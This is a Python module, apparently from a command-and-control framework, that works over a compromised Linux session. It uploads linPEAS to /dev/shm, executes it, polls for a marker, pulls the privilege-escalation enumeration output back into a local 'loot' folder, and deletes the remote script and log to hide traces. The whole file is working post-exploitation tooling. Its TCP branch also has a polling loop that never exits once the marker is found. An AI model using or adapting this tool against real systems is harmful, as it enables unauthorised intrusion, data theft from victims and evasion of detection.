import base64
import time
from core.module_base import ModuleBase
from core import session_manager, shell
from colorama import Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

class Module(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "inmemory_linpeas"
        self.description = "Upload linPEAS to /dev/shm, execute in-memory, wait for completion, and capture output"
        self.options = {
            "session": {
                "description": "Target session ID or alias",
                "required": True,
                "value": ""
            },
            "linpeas_path": {
                "description": "Local path to linpeas.sh script",
                "required": True,
                "value": "loot/linpeas.sh"
            }
        }

    def run(self):
        sid = session_manager.resolve_sid(self.options["session"]["value"])
        if not sid or sid not in session_manager.sessions:
            print(brightred + "[!] Invalid session")
            return

        session = session_manager.sessions[sid]
        os_type = session.metadata.get("os", "").lower()
        if "linux" not in os_type:
            print(brightred + "[!] This module only runs on Linux targets")
            return

        linpeas_path = self.options["linpeas_path"]["value"]
        remote_script = "/dev/shm/linpeas.sh"
        remote_log = "/tmp/lp_check.txt"
        marker = "GUNNER YOU HAVE YOUR FEAST"

        # TCP session branch
        if session_manager.is_tcp_session(sid):
            try:
                print(brightyellow + "[*] Uploading linPEAS to /dev/shm...")
                shell.upload_file_tcp(sid, linpeas_path, remote_script)
            except Exception as e:
                print(brightred + f"[!] Upload failed: {e}")
                return

            print(brightyellow + "[*] Setting permissions and executing linPEAS...")
            shell.run_command_tcp(sid, f"chmod +x {remote_script}", timeout=0.5)
            # execute and append marker
            exec_cmd = f"{remote_script} > {remote_log} 2>&1; echo '{marker}' >> {remote_log}"
            shell.run_command_tcp(sid, exec_cmd, timeout=0.5)

            # === BLOCKING POLL FOR MARKER ===
            print(brightyellow + "[*] Waiting for linPEAS to finish…")
            while True:
                if session_manager.is_tcp_session(sid):
                    out = shell.run_command_tcp(sid,
                    f"grep -F '{marker}' {remote_log} || echo ''"
                    , timeout=0.5)
                else:
                    out = shell.run_command_http(sid,
                    f"grep -F '{marker}' {remote_log} || echo ''"
                    )

                if marker not in out:
                    time.sleep(1)

                else:

                    print(brightyellow + "[*] Downloading output...")
                    local_outfile = f"./loot/{sid}_linpeas.txt"
                    shell.download_file_tcp(sid, remote_log, local_outfile)

                    print(brightyellow + "[*] Cleaning up remote files...")
                    shell.run_command_tcp(sid, f"rm -f {remote_script} {remote_log}", timeout=0.5)

                    print(brightgreen + f"[+] linPEAS output saved to {local_outfile}")
                    print(brightblue + "\n=== linPEAS Output ===\n")
                    try:
                        with open(local_outfile, "r") as f:
                            print(f.read())
                    except Exception:
                        print(brightred + "[!] Could not read local output file.")

        # HTTP session branch
        elif session_manager.sessions[sid].transport in ("http", "https"):
            try:
                print(brightyellow + "[*] Uploading linPEAS to /dev/shm...")
                shell.upload_file_http(sid, linpeas_path, remote_script)
            except Exception as e:
                print(brightred + f"[!] Upload failed: {e}")
                return

            print(brightyellow + "[*] Setting permissions and executing linPEAS...")
            shell.run_command_http(sid, f"chmod +x {remote_script}")
            exec_cmd = f"{remote_script} > {remote_log} 2>&1; echo '{marker}' >> {remote_log}"
            shell.run_command_http(sid, exec_cmd)
            wait_cmd = f"bash -c 'until grep -F \"{marker}\" {remote_log}; do sleep 1; done'"
            shell.run_command_http(sid, wait_cmd)

            print(brightyellow + "[*] Downloading output...")
            local_outfile = f"./loot/{sid}_linpeas.txt"
            shell.download_file_http(sid, remote_log, local_outfile)

            print(brightyellow + "[*] Cleaning up remote files...")
            shell.run_command_http(sid, f"rm -f {remote_script} {remote_log}")

            print(brightgreen + f"[+] linPEAS output saved to {local_outfile}")
            print(brightblue + "\n=== linPEAS Output ===\n")
            try:
                with open(local_outfile, "r") as f:
                    print(f.read())
            except Exception:
                print(brightred + "[!] Could not read local output file.")

        else:
            print(brightred + "[-] ERROR unsupported session type.")